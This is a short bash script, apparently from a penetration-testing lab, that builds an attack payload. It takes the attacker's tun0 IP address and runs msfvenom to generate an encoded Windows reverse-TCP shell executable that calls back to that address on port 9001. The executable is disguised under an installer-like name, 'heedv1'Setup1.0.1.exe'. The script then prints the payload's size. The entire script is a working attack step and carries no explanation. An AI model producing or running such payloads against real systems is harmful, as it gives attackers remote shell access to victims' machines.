echo "Getting tun0 IP..."
ip=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
echo "$ip"

echo "Making payload..."
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$ip LPORT=9001 -b "\x00" -e x86/shikata_ga_nai -f exe -o "heedv1'Setup1.0.1.exe"

echo "Getting size of payload..."
size=$(stat -c%s "heedv1'Setup1.0.1.exe")
echo "$size" 

